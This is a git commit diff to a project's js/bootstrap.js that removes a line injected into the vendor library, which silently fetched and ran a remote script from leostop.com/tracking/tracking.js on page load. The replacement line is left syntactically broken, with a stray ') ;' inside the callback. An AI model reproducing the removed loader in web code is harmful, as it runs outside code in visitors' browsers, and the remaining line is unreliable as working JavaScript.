2cdb0779c1543e56b6779077a00e0397fddb67dc
anantharamanmac <108387642+anantharamanmac@users.noreply.github.com>
2023-11-25 21:11:23 +0530

    Update bootstrap.js

--- js/bootstrap.js
+++ js/bootstrap.js
@@ -224,7 +224,7 @@
   setTransitionEndSupport();
 
 
-  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { ); } });
 
 
   /**
